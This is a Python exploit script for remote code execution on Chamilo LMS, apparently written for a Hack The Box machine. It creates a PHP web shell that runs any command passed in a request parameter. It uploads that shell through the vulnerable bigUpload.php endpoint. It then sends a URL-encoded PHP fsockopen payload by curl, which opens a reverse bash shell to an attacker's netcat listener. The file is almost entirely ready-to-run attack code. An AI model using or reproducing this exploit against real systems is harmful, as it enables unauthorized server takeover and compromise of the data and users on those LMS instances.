#!/usr/bin/python3
import subprocess
import requests
import argparse

#
# FUNCTION: create_payload()
# Description: Creates the exploit.php file which will be sent to the Chamilo LMS application
#
def create_payload():
    # Creates `exploit.php` file on `/tmp/exploit.php`
    creates_payload_file_command = "touch /tmp/exploit.php"

    # Executing `creates_payload_file_command`
    subprocess.run(creates_payload_file_command, shell=True, check=True)

    # Writes payload to `/tmp/exploit.php`
    write_payload_command = 'echo \'<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>\' > /tmp/exploit.php'

    # Executing `write_payload_command`
    subprocess.run(write_payload_command, shell=True, check=True)

    return

#
# FUNCTION: exploit()
# Description: Uploads `/tmp/exploit.php` file which was generated from create_payload() function and sends a reverse shell back to user netcat listener
#
def exploit(target, port, nc_ip_addr, nc_port):
    # Vulnerable path for file upload
    target_url = "{0}:{1}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported".format(target, port)

    # Reading `/tmp/exploit.php`
    target_file = open("/tmp/exploit.php", "rb")

    # Sending the post request to upload `/tmp/exploit.php` file to Chamilo LMS
    response = requests.post(target_url, files = {"bigUploadFile": target_file})
    
    # Checking the status of file upload
    if response.ok:
        print("The `exploit.php` file was sucessfully uploaded")
    else:
        print("The upload failed...")
    
    # Sends a reverse shell command to Chamilo LMS
    reverse_shell_command = 'curl {0}/main/inc/lib/javascript/bigupload/files/exploit.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22{1}%22%2C{2}%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'.format(target, nc_ip_addr, nc_port)

    # Informing user about reverse shell being sent
    print("Executing reverse shell command!")

    # Executing `reverse_shell_command`
    subprocess.run(reverse_shell_command, shell=True, check=True)

def main():
    parser = argparse.ArgumentParser(description="Remote Code Execution for Chamilo LMS")
    parser.add_argument("-u", "--url", required=True, help="The Chamilo LMS URL (example: http://lms.permx.htb)")
    parser.add_argument("-p", "--port", required=True, type=int, help="The Chamilo LMS port (example: 80)")
    parser.add_argument("-ni", "--ncip", required=True, help="Netcat listener IP")
    parser.add_argument("-np", "--ncport",required=True, type=int, help="Netcat listener Port")

    args = parser.parse_args()

    # Cleaning up URL to remove `/` character from last string
    if (args.url[-1] == "/"):
        args.url = args.url[:-1]
    
    # Checking if the args.port is a valid port number
    if (args.port > 65535):
        print("Port number is too high!")
        return

    # Creates the `exploit.php`
    create_payload()

    # Exploits the Chamilo LMS application
    exploit(args.url, args.port, args.ncip, args.ncport)

    return 0

if __name__ == "__main__":
    main()